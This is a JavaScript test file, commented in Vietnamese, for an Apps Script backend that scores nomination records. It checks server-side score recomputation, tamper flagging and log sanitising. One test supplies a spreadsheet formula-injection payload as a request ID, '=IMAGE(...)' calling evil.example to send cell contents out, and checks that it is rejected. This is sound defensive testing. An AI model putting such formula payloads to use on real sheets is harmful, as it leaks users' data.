import test from 'node:test';
import assert from 'node:assert/strict';
import { taoMoiTruong, hoSoMau } from './helpers/gas-emulator.mjs';
import { tinhDiem, LUA_CHON } from '../src/lib/diem036.js';

// Các bài kiểm thử rút ra từ báo cáo kiểm tra độc lập: chống làm giả điểm, chặn chèn công thức vào nhật ký, v.v.
const nhan = (env, record) => env.goi({ action: 'submit', record });
const cot = (env, khoa) => env.chay(`chiSoCot_(${JSON.stringify(khoa)})`) - 1;
const dong = (env, n) => env.sheets['Tất cả hồ sơ'].rows[n - 1];
const sao = (x) => JSON.parse(JSON.stringify(x));

test('Apps Script TỰ tính lại điểm: bỏ qua điểm máy chủ, trục và đối chiếu do bên gọi gửi (không làm giả được điểm xếp hạng)', () => {
  const env = taoMoiTruong();
  const chiTiet = { he: 'A', medal: 45, accumulated: 20, years: 18, training: 0, management: 5 }; // đáng 85 điểm
  assert.equal(nhan(env, hoSoMau({ scoreDetail: chiTiet, scoreClaimed: 85, scoreServer: 100, scoreAxes: [50, 20, 15, 15], scoreCheck: 'Khớp' })).ok, true);
  const r = dong(env, 2);
  assert.equal(r[cot(env, 'diemMayChu')], 85);
  assert.deepEqual([r[cot(env, 'truc1')], r[cot(env, 'truc2')], r[cot(env, 'truc3')], r[cot(env, 'truc4')]], [45, 20, 15, 5]);
  assert.equal(r[cot(env, 'doiChieu')], 'Khớp');
  assert.equal(nhan(env, hoSoMau({ scoreDetail: chiTiet, scoreClaimed: 100, scoreServer: 100, scoreCheck: 'Khớp' })).ok, true);
  const r2 = dong(env, 3);
  assert.equal(r2[cot(env, 'diemMayChu')], 85);
  assert.equal(r2[cot(env, 'diemTuCham')], 100);
  assert.equal(r2[cot(env, 'doiChieu')], 'LỆCH');
});

test('Chi tiết chấm điểm bị sửa hoặc sai hệ: không có điểm máy chủ, gắn cờ đúng', () => {
  const env = taoMoiTruong();
  const tot = { he: 'A', medal: 45, accumulated: 20, years: 18, training: 0, management: 5 };
  const cac = [
    [{ ...tot, medal: 99 }, 'nomination_a', 'Chi tiết không hợp lệ'], [{ ...tot, years: -3 }, 'nomination_a', 'Chi tiết không hợp lệ'], [{ ...tot, years: 2.5 }, 'nomination_a', 'Chi tiết không hợp lệ'],
    [{ ...tot, management: '5' }, 'nomination_a', 'Chi tiết không hợp lệ'], [{ he: 'C' }, 'nomination_a', 'Chi tiết không hợp lệ'], ['abc', 'nomination_a', 'Chi tiết không hợp lệ'], [[], 'nomination_a', 'Chi tiết không hợp lệ'],
    [tot, 'nomination_b', 'Sai hệ'],
  ];
  for (const [chiTiet, loai, nhanDoiChieu] of cac) {
    const kq = nhan(env, hoSoMau({ submissionType: loai, scoreDetail: chiTiet, scoreClaimed: 99, scoreServer: 99 }));
    assert.equal(kq.ok, true, JSON.stringify(chiTiet));
    const r = dong(env, env.sheets['Tất cả hồ sơ'].getLastRow());
    assert.equal(r[cot(env, 'doiChieu')], nhanDoiChieu, JSON.stringify(chiTiet));
    assert.equal(r[cot(env, 'diemMayChu')], '', JSON.stringify(chiTiet));
    assert.equal(r[cot(env, 'truc1')], '', JSON.stringify(chiTiet));
    if (nhanDoiChieu === 'Sai hệ') assert.equal(r[cot(env, 'diemTuCham')], '', 'sai hệ: không ghi điểm người nộp gửi');
  }
});

test('Công thức tính điểm trong Code.gs khớp từng tổ hợp với src/lib/diem036.js', () => {
  const env = taoMoiTruong();
  assert.deepEqual(sao(env.chay('LUA_CHON_GS')), LUA_CHON, 'danh sách lựa chọn phải giống nhau');
  const kiemTra = env.chay('kiemTraChiTiet_');
  const tinhGs = env.chay('tinhDiemGs_');
  const so = (d) => { const kt = kiemTra(d); assert.equal(kt.ok, true, JSON.stringify(d)); return sao(tinhGs(kt.v)); };
  let n = 0;
  for (const medal of LUA_CHON.A.medal) for (const accumulated of LUA_CHON.A.accumulated) for (let years = 0; years <= 40; years++) for (const training of LUA_CHON.A.training) for (const management of LUA_CHON.A.management) {
    const d = { he: 'A', medal, accumulated, years, training, management };
    const a = so(d), b = tinhDiem(d);
    assert.deepEqual([a.truc, a.tong], [b.truc, b.tong]); n++;
  }
  for (let years = 0; years <= 55; years++) for (const club of LUA_CHON.B.club) for (const system of LUA_CHON.B.system) for (const athletes of LUA_CHON.B.athletes)
    for (const coaches of LUA_CHON.B.coaches) for (const role1 of LUA_CHON.B.role1) for (const role2 of LUA_CHON.B.role2) {
      const d = { he: 'B', years, club, system, athletes, coaches, role1, role2 };
      const a = so(d), b = tinhDiem(d);
      assert.deepEqual([a.truc, a.tong], [b.truc, b.tong]); n++;
    }
  assert.ok(n > 100000, `chỉ so ${n} tổ hợp`);
});

test('Nhật ký: mã yêu cầu chứa công thức bị từ chối và được chặn công thức khi ghi nhật ký', () => {
  const env = taoMoiTruong();
  const kq = nhan(env, hoSoMau({ requestId: '=IMAGE("https://evil.example/?x="&JOIN(",",A1:A9))' }));
  assert.equal(kq.ok, false);
  assert.equal(kq.loi, 'ma_yeu_cau');
  const nk = env.sheets['Nhật ký'].rows;
  assert.equal(nk.length, 1);
  assert.equal(nk[0][3].charAt(0), "'");
  assert.ok(nk[0][3].length <= 81);
  for (const cell of nk[0].slice(1)) assert.ok(!/^[=+\-@]/.test(String(cell)), 'ô nhật ký bắt đầu bằng ký tự công thức: ' + cell);
});

test('Lỗi nội bộ tạm thời trả thuLai (máy chủ trang sẽ thử lại, mã yêu cầu chống ghi trùng)', () => {
  const env = taoMoiTruong();
  env.sheets['Tất cả hồ sơ'].getLastRow = () => { throw new Error('Service error: Spreadsheets'); };
  const kq = nhan(env, hoSoMau());
  assert.deepEqual([kq.ok, kq.loi, kq.thuLai], [false, 'noi_bo', true]);
});

test('Mở rộng bảng: thêm dòng cho bảng gốc và cả các tab xếp hạng', () => {
  const env = taoMoiTruong();
  const goc = env.sheets['Tất cả hồ sơ'];
  goc.maxRows = 2;
  const heA = Object.assign(Object.create(Object.getPrototypeOf(goc)), { ten: 'Hệ A - Xếp hạng', maxRows: 3, chen: 0, rows: [], formulas: new Map() });
  env.sheets['Hệ A - Xếp hạng'] = heA;
  assert.equal(nhan(env, hoSoMau()).ok, true);
  assert.equal(nhan(env, hoSoMau()).ok, true); // vượt 2 dòng: mở rộng bảng gốc thêm 500 và tab xếp hạng theo
  assert.ok(goc.maxRows >= 500);
  assert.ok(heA.chen >= 1 && heA.maxRows >= goc.maxRows + 5, 'tab xếp hạng phải được mở rộng theo bảng gốc');
});

test('Mã yêu cầu hợp lệ của máy chủ trang (srv-<32 ký tự hex>) và của trình duyệt (32 hex) được chấp nhận', () => {
  const env = taoMoiTruong();
  for (const id of ['srv-0123456789abcdef0123456789abcdef', '0123456789abcdef0123456789abcdef']) assert.equal(nhan(env, hoSoMau({ requestId: id })).ok, true, id);
});
